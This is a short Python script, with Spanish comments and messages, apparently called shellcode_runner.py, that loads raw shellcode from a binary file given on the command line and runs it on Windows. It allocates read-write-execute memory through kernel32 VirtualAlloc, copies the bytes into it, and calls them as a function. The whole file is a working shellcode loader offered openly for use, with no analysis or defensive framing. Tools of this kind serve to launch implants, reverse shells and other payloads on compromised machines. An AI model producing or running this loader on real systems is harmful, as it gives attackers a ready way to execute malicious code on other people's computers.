#!/usr/bin/env python3
import sys
import ctypes
from ctypes import wintypes

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

def ejecutar_shellcode_desde_archivo(ruta_bin):
    # Leer el archivo binario
    with open(ruta_bin, "rb") as f:
        shellcode = f.read()
    if not shellcode:
        print("[-] El archivo está vacío")
        return

    print(f"[+] Shellcode cargado: {len(shellcode)} bytes")

    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    # Reservar memoria ejecutable
    ptr = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        print("[-] VirtualAlloc falló")
        return

    # Copiar shellcode
    ctypes.memmove(ptr, shellcode, len(shellcode))
    print("[*] Ejecutando shellcode...")
    # Ejecutar
    funcion = ctypes.CFUNCTYPE(None)(ptr)
    funcion()
    print("[+] Shellcode finalizado")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python shellcode_runner.py <archivo.bin>")
        sys.exit(1)
    ejecutar_shellcode_desde_archivo(sys.argv[1])